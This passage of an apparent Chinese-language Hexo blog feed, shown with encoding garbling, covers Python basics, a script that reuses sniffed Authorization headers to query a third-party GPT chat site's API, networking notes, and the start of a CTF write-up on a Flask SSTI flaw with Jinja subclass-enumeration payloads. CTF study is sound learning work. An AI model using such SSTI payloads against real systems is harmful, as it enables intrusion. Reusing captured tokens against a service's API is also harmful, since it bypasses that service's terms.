href="https://www.runoob.com/python3/python3-string-len.html">len()</a></td><td align="left">è®¡ç®—é›†åˆå…ƒç´ ä¸ªæ•°</td></tr></tbody></table><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p>åŸºæœ¬ç»“æ„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>() :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line"></span><br><span class="line">hello()</span><br></pre></td></tr></table></figure><h1 id="éšä¾¿å†™çš„ä¸€ä¸ªpythonç¨‹åº"><a href="#éšä¾¿å†™çš„ä¸€ä¸ªpythonç¨‹åº" class="headerlink" title="éšä¾¿å†™çš„ä¸€ä¸ªpythonç¨‹åº"></a>éšä¾¿å†™çš„ä¸€ä¸ªpythonç¨‹åº</h1><p>æŠ“åŒ…æŸgptå¹¶åœ¨ç»ˆç«¯é—®ç­”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sys.stdout.encoding)</span><br><span class="line"><span class="comment">###########ç¬¬ä¸€æ¬¡è¿è¡ŒåæŠŠç”Ÿæˆçš„topicIdç²˜è´´åœ¨æ­¤################################</span></span><br><span class="line">topicId = <span class="number">0</span>     <span class="comment">######################</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line">host = <span class="string">&quot;api.xiabb.chat&quot;</span></span><br><span class="line">UA = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################æŠ“åŒ…å¹¶å¡«å†™è‡ªå·±çš„Authorization##############</span></span><br><span class="line">Authorization = <span class="string">&quot;example&quot;</span></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendMessage</span>():</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/message&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: host,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: UA,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: Authorization,</span><br><span class="line">        <span class="string">&quot;Language&quot;</span>: <span class="string">&quot;zh-CN&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    msg = <span class="built_in">input</span>(<span class="string">&#x27;msg:&#x27;</span>)</span><br><span class="line">    data = &#123;<span class="string">&quot;topicId&quot;</span>:topicId,</span><br><span class="line">            <span class="string">&quot;messages&quot;</span>:[],</span><br><span class="line">            <span class="string">&quot;content&quot;</span>:msg,</span><br><span class="line">            <span class="string">&quot;contentFiles&quot;</span>:[]</span><br><span class="line">            &#125;</span><br><span class="line">    res = requests.post(url=url, json=data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        json_res = res.json()</span><br><span class="line">        messageRes = json_res.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(messageRes)</span><br><span class="line">        messageId = messageRes[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(messageId)</span><br><span class="line">        <span class="comment"># options</span></span><br><span class="line">        url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/message/&quot;</span> + <span class="built_in">str</span>(messageId)</span><br><span class="line">        opts_headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Request-Method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Request-Headers&quot;</span>: <span class="string">&quot;authorization,content-type&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        opts_res = requests.options(url=url,headers=opts_headers)</span><br><span class="line">        msg_res = requests.post(url,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(msg_res.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;something error in sending messge&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newTopic</span>():</span><br><span class="line">    url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/save&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: host,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: UA,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: Authorization,</span><br><span class="line">        <span class="string">&quot;Language&quot;</span>: <span class="string">&quot;zh-CN&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;roleId&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;title&quot;</span>:<span class="string">&quot;ä½ å¥½&quot;</span>,</span><br><span class="line">        <span class="string">&quot;isLock&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;systemMessage&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;params&quot;</span>:<span class="string">&quot;&#123;\&quot;model\&quot;:\&quot;gpt-3.5-turbo-16k-0613\&quot;,\&quot;is_webSearch\&quot;:false,\&quot;message\&quot;:[],\&quot;systemMessage\&quot;:null,\&quot;requestMsgCount\&quot;:6,\&quot;temperature\&quot;:0.8,\&quot;max_tokens\&quot;:8192&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(headers=headers,url=url,json=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        json_res = res.json()</span><br><span class="line">        result = json_res.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;it works!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> topicId:</span><br><span class="line">    topicId = newTopic()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;topicId:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(topicId)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;topicId exist&quot;</span>)</span><br><span class="line">sendMessage()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pythonåŸºç¡€&quot;&gt;&lt;a href=&quot;#pythonåŸºç¡€&quot; class=&quot;headerlink&quot; title=&quot;pythonåŸºç¡€&quot;&gt;&lt;/a&gt;pythonåŸºç¡€&lt;/h1&gt;&lt;p&gt;ä¹‹é—´ä¹Ÿå­¦è¿‡ä¸€äº›pythonç¼–ç¨‹åŸºç¡€,ä½†å¤§éƒ½æ˜¯é›¶æ•£ç¢ç‰‡åŒ–çš„çŸ¥è¯†&lt;/p&gt;
&lt;p&gt;æ•…åœ¨æ­¤ç³»ç»Ÿåœ°è®°å½•</summary>
      
    
    
    
    <category term="ç¬”è®°2" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B02/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>ç½‘ç»œåŸºç¡€</title>
    <link href="http://example.com/2024/01/29/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/01/29/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</id>
    <published>2024-01-29T02:18:30.000Z</published>
    <updated>2024-01-29T15:34:01.405Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç½‘ç»œåŸºç¡€"><a href="#ç½‘ç»œåŸºç¡€" class="headerlink" title="ç½‘ç»œåŸºç¡€"></a>ç½‘ç»œåŸºç¡€</h1><h2 id="ç½‘ç»œå±‚çº§ç»“æ„"><a href="#ç½‘ç»œå±‚çº§ç»“æ„" class="headerlink" title="ç½‘ç»œå±‚çº§ç»“æ„"></a>ç½‘ç»œå±‚çº§ç»“æ„</h2><p>é¦–å…ˆå°±æ˜¯ç½‘ç»œåˆ†å±‚äº†,å…ˆä¸Šå›¾</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/OSI%E4%B8%8ETCP.webp"></p><p>ä¸€èˆ¬éƒ½æ˜¯æŒ‰ç…§tcp&#x2F;ipåˆ†å±‚æ¥å®ç°ç½‘ç»œåˆ†å±‚, ä¹Ÿå°±æ˜¯ ç‰©æ•°ç½‘ä¼ åº” äº”å±‚æ¨¡å‹</p><blockquote><ol><li>åº”ç”¨å±‚</li></ol><p>åº”ç”¨å±‚æ˜¯æˆ‘ä»¬ç»å¸¸æ¥è§¦ä½¿ç”¨çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚å¸¸ç”¨çš„httpåè®®ã€ftpåè®®ï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰ã€snmpï¼ˆç½‘ç»œç®¡ç†åè®®ï¼‰ã€telnet ï¼ˆè¿œç¨‹ç™»å½•åè®® ï¼‰ã€smtpï¼ˆç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼‰ã€dnsï¼ˆåŸŸåè§£æï¼‰ï¼Œè¿™æ¬¡ä¸»è¦æ˜¯é¢å‘ç”¨æˆ·çš„äº¤äº’çš„ã€‚è¿™é‡Œçš„åº”ç”¨å±‚é›†æˆäº†osiåˆ†å±‚æ¨¡å‹ä¸­ çš„åº”ç”¨ã€ä¼šè¯ã€è¡¨ç¤ºå±‚ä¸‰å±‚çš„åŠŸèƒ½ã€‚</p><ol start="2"><li>ä¼ è¾“å±‚</li></ol><p>ä¼ è¾“å±‚çš„ä½œç”¨å°±æ˜¯å°†åº”ç”¨å±‚çš„æ•°æ®è¿›è¡Œä¼ è¾“è½¬è¿ã€‚æ¯”å¦‚æˆ‘ä»¬å¸¸è¯´çš„tcpï¼ˆå¯é çš„ä¼ è¾“æ§åˆ¶åè®®ï¼‰ã€udpï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰ã€‚ä¼ è¾“å•ä½ä¸ºæŠ¥æ–‡æ®µã€‚<br>tcpï¼ˆTransmission Control Protocolï¼‰ é¢å‘è¿æ¥ï¼ˆå…ˆè¦å’Œå¯¹æ–¹ç¡®å®šè¿æ¥ã€ä¼ è¾“ç»“æŸéœ€è¦æ–­å¼€è¿æ¥ï¼Œç±»ä¼¼æ‰“ç”µè¯ï¼‰ã€å¤æ‚å¯é çš„ã€æœ‰å¾ˆå¥½çš„é‡ä¼ å’ŒæŸ¥é”™æœºåˆ¶ã€‚</p><p>ä¸€èˆ¬ç”¨ä¸é«˜é€Ÿã€å¯é çš„é€šä¿¡æœåŠ¡udpï¼ˆuser datagram protocolï¼‰é¢å‘æ— è¿æ¥ï¼ˆæ— éœ€ç¡®è®¤å¯¹æ–¹æ˜¯å¦å­˜åœ¨ï¼Œç±»ä¼¼å¯„åŒ…è£¹ï¼‰ã€ç®€å•é«˜æ•ˆã€æ²¡æœ‰é‡ä¼ æœºåˆ¶ã€‚ä¸€èˆ¬ç”¨äºå³æ—¶é€šè®¯ã€å¹¿æ’­é€šä¿¡ç­‰ã€‚</p><ol start="3"><li>ç½‘ç»œå±‚</li></ol><p>æ¥å¤„ç†ç½‘ç»œä¸­æµåŠ¨çš„æ•°æ®åŒ…ï¼Œæ•°æ®åŒ…ä¸ºæœ€å°çš„ä¼ é€’å•ä½ï¼Œæ¯”å¦‚æˆ‘ä»¬å¸¸ç”¨çš„ipåè®®ã€icmpåè®®ã€arpåè®®ï¼ˆé€šè¿‡åˆ†æipåœ°å€å¾—å‡ºç‰©ç†macåœ°å€ï¼‰ã€‚</p><ol start="4"><li>æ•°æ®é“¾è·¯å±‚</li></ol><p>æ•°æ®é“¾è·¯å±‚ä¸€èˆ¬ç”¨æ¥å¤„ç†è¿æ¥ç¡¬ä»¶çš„éƒ¨åˆ†ï¼ŒåŒ…æ‹¬æ§åˆ¶ç½‘å¡ã€ç¡¬ä»¶ç›¸å…³çš„è®¾å¤‡é©±åŠ¨ç­‰ã€‚ä¼ è¾“å•ä½æ•°æ®å¸§ã€‚</p><ol start="5"><li>ç‰©ç†å±‚</li></ol><p>ç‰©ç†å±‚ä¸€èˆ¬ä¸ºè´Ÿè´£æ•°æ®ä¼ è¾“çš„ç¡¬ä»¶ï¼Œæ¯”å¦‚æˆ‘ä»¬äº†è§£çš„åŒç»çº¿ç”µç¼†ã€æ— çº¿ã€å…‰çº¤ç­‰ã€‚æ¯”ç‰¹æµå…‰ç”µç­‰ä¿¡å·å‘é€æ¥æ”¶æ•°æ®ã€‚</p></blockquote><p>ç®€è€Œè¨€ä¹‹, è‡ªé¡¶å‘ä¸‹æ¥ç†è§£</p><p>__åº”ç”¨å±‚__å®ç°äº†å…·ä½“çš„åŠŸèƒ½,å¦‚ æ”¶å‘é‚®ä»¶, æ–‡ä»¶ä¼ è¾“ç­‰, å¯¹äºå¦‚ä½•ä¼ è¾“, å¹¶ä¸å…³å¿ƒ</p><p>https, http, ftp, dnsâ€¦</p><p>__ä¼ è¾“å±‚__åˆ™å®ç°äº†å¦‚ä½•ä¼ è¾“, å¦‚ä½•å°†åºå¤§çš„æ•°æ®åˆ†å—, ä½¿å…¶èƒ½å¤Ÿå®Œæ•´ä¼ è¾“å‡ºå», å½“æŸä¸€å—æ•°æ®ä¸¢å¤±ä½¿, åˆ¤æ–­æ˜¯å¦è¦å¯¹ä¸¢å¤±çš„æ•°æ®æ®µé‡ä¼ </p><p>tcp, udpâ€¦</p><p>__ç½‘ç»œå±‚__åˆ™æ˜¯è´Ÿè´£æ•°æ®å¦‚ä½•ä»ä¸€ç«¯åˆ°å¦ä¸€ç«¯, å³æˆ‘ä»¬å¸¸è§çš„ipåè®®å¯»å€, ä»–ä¹Ÿä¼šå°†ä¼ è¾“å±‚çš„æ•°æ®æ®µåˆ†å—, å¹¶åœ¨æ¯ä¸€å—å‰é¢åŠ ä¸ŠipåŒ…å¤´, å½¢æˆipæŠ¥æ–‡(å®é™…ä¸Šæ¯ä¸€å±‚éƒ½ä¼šåˆ†å—å¹¶åŠ ä¸Šè‡ªå·±çš„åŒ…å¤´)</p><p>__æ•°æ®é“¾è·¯å±‚__å¹¶ä¸å…³å¿ƒä»¥ä¸Šä»»ä½•ä¸œè¥¿, ä»–è¦åšçš„åªæ˜¯å®ç°æ•°æ®ç‚¹åˆ°ç‚¹çš„ä¼ è¾“, ä¾‹å¦‚,ä»aåœ°åˆ°zåœ°, éœ€è¦ç»è¿‡b,c,d,e,fâ€¦ ä¸¤ç‚¹ä¹‹é—´å¦‚ä½•ä¼ è¾“å°±æ˜¯åœ¨æ•°æ®é“¾è·¯å±‚ä¸Šå®ç°çš„. å·¥ä½œåœ¨æ­¤æ­¤å±‚çº§çš„åè®®MACåè®®,åŒæ„ä¼šå°†ipæŠ¥æ–‡åˆ†ç‰‡å¹¶åŠ ä¸ŠMACå¤´éƒ¨å½¢æˆMACå¸§</p><p><strong>ç‰©ç†å±‚</strong>,æ˜¾è€Œæ˜“è§,é€šè¿‡å°†æ•°æ®è½¬æ¢ä¸ºå…‰ä¿¡å·æˆ–ç”µä¿¡å·ä¼ è¾“å‡ºå»</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="ä¸€äº›è¯·æ±‚æ–¹æ³•"><a href="#ä¸€äº›è¯·æ±‚æ–¹æ³•" class="headerlink" title="ä¸€äº›è¯·æ±‚æ–¹æ³•"></a>ä¸€äº›è¯·æ±‚æ–¹æ³•</h3><p>GET, POST, HEAD, OPTIONS, PUTâ€¦</p><h3 id="çŠ¶æ€ç "><a href="#çŠ¶æ€ç " class="headerlink" title="çŠ¶æ€ç "></a>çŠ¶æ€ç </h3><table><thead><tr><th align="left">åˆ†ç±»</th><th align="left">åˆ†ç±»æè¿°</th></tr></thead><tbody><tr><td align="left">1**</td><td align="left">ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œéœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œ</td></tr><tr><td align="left">2**</td><td align="left">æˆåŠŸï¼Œæ“ä½œè¢«æˆåŠŸæ¥æ”¶å¹¶å¤„ç†</td></tr><tr><td align="left">3**</td><td align="left">é‡å®šå‘ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ“ä½œä»¥å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">4**</td><td align="left">å®¢æˆ·ç«¯é”™è¯¯ï¼Œè¯·æ±‚åŒ…å«è¯­æ³•é”™è¯¯æˆ–æ— æ³•å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">5**</td><td align="left">æœåŠ¡å™¨é”™è¯¯ï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯</td></tr></tbody></table><h3 id="HTTP-Cookie"><a href="#HTTP-Cookie" class="headerlink" title="HTTP Cookie"></a>HTTP Cookie</h3><blockquote><p>HTTP Cookieï¼ˆä¹Ÿå« Web Cookie æˆ–æµè§ˆå™¨ Cookieï¼‰æ˜¯æœåŠ¡å™¨å‘é€åˆ°ç”¨æˆ·æµè§ˆå™¨å¹¶ä¿å­˜åœ¨æœ¬åœ°çš„ä¸€å°å—æ•°æ®ã€‚æµè§ˆå™¨ä¼šå­˜å‚¨ cookie å¹¶åœ¨ä¸‹æ¬¡å‘åŒä¸€æœåŠ¡å™¨å†å‘èµ·è¯·æ±‚æ—¶æºå¸¦å¹¶å‘é€åˆ°æœåŠ¡å™¨ä¸Šã€‚é€šå¸¸ï¼Œå®ƒç”¨äºå‘ŠçŸ¥æœåŠ¡ç«¯ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€æµè§ˆå™¨â€”â€”å¦‚ä¿æŒç”¨æˆ·çš„ç™»å½•çŠ¶æ€ã€‚Cookie ä½¿åŸºäº<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_%E6%98%AF%E6%97%A0%E7%8A%B6%E6%80%81%EF%BC%8C%E6%9C%89%E4%BC%9A%E8%AF%9D%E7%9A%84">æ— çŠ¶æ€</a>çš„ HTTP åè®®è®°å½•ç¨³å®šçš„çŠ¶æ€ä¿¡æ¯æˆä¸ºäº†å¯èƒ½ã€‚</p></blockquote><p>æœåŠ¡å™¨å‘ç”¨æˆ·å‘é€cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</span><br></pre></td></tr></table></figure><p>ç”¨æˆ·æºå¸¦cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: xxxxxx=xxxxxx</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç½‘ç»œåŸºç¡€&quot;&gt;&lt;a href=&quot;#ç½‘ç»œåŸºç¡€&quot; class=&quot;headerlink&quot; title=&quot;ç½‘ç»œåŸºç¡€&quot;&gt;&lt;/a&gt;ç½‘ç»œåŸºç¡€&lt;/h1&gt;&lt;h2 id=&quot;ç½‘ç»œå±‚çº§ç»“æ„&quot;&gt;&lt;a href=&quot;#ç½‘ç»œå±‚çº§ç»“æ„&quot; class=&quot;headerlink&quot; title=&quot;ç½‘ç»œå±‚çº§ç»“</summary>
      
    
    
    
    <category term="ç¬”è®°2" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B02/"/>
    
    
    <category term="ç½‘ç»œåŸºç¡€" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <link href="http://example.com/2024/01/28/GYCTF2020-FlaskApp/"/>
    <id>http://example.com/2024/01/28/GYCTF2020-FlaskApp/</id>
    <published>2024-01-28T12:23:09.000Z</published>
    <updated>2024-01-29T14:57:35.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>åœ¨è§£å¯†çš„é¡µé¢è¾“å…¥ä»»æ„å‡ ä¸ªå­—æ¯(ébase64ç ),ä¼šå‘ç°æŠ¥é”™,æ³„éœ²éƒ¨åˆ†æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line"></span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line"></span><br><span class="line">        tmp = <span class="string">&quot;ç»“æœ ï¼š &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§tmpé‡Œå°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹base64è§£ç åç›´æ¥åµŒå…¥äº†è¿›å»</p><p>æœ‰ç†ç”±æ€€ç–‘ssti</p><p>å°è¯•ä¸€ä¸‹</p><p>æˆ‘ä»¬è¾“å…¥<code>e3sxMTExfX0=</code>(ä¹Ÿå°±æ˜¯1111ç¼–ç åçš„ç»“æœ)</p><p>ä¼šè¿”å›ä¸€ä¸ª<code>1111</code>,æœç„¶æ˜¯ssti</p><p>è¿™é‡Œæµ…å°è¯•äº†ä¸€ä¸‹,å‘ç°ä¸èƒ½ç›´æ¥å›æ˜¾å‡ºæ¥_<em>subclass</em>_()çš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&#x27;&#x27;.__class__.__base__.__subclasses__())%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__bases__[0].__subclasses__() %&#125;&#123;% print(i) %&#125;&#123;% endfor 